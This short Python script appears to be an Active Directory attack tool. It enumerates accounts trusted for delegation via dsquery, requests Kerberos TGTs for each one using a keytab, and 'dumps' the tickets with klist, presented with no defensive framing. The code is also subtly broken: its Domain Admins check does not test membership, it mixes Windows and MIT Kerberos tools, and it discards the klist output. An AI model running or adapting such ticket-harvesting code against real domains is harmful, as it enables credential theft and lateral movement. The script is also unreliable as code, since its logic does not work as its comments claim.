import subprocess

# Check if the current user is a member of the Domain Admins group
if not subprocess.run(["net", "localgroup", "Domain Admins"], capture_output=True).returncode == 0:
    print("Error: current user is not a member of the Domain Admins group.")
    exit(1)

# Get a list of all service accounts in the domain
output = subprocess.run(["dsquery", "*", "-filter", "(&(objectCategory=user)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=524288))"], capture_output=True, text=True).stdout

# Extract the sAMAccountName of each service account
service_accounts = [line.split(",")[0].split("=")[1] for line in output.splitlines()]

# Print the list of service accounts
print("Found {} service accounts:".format(len(service_accounts)))
print(service_accounts)

# Request a Kerberos TGT for each service account
for service_account in service_accounts:
    print("Requesting TGT for {}".format(service_account))
    subprocess.run(["kinit", "-k", "-t", "ServiceAccount.keytab", service_account], capture_output=True)

# List the TGTs in the local cache
print("Listing TGTs in local cache:")
subprocess.run(["klist"], capture_output=True)

# Dump the TGTs from the local cache
print("Dumping TGTs from local cache:")
subprocess.run(["klist", "-kte", "ServiceAccount.keytab"], capture_output=True)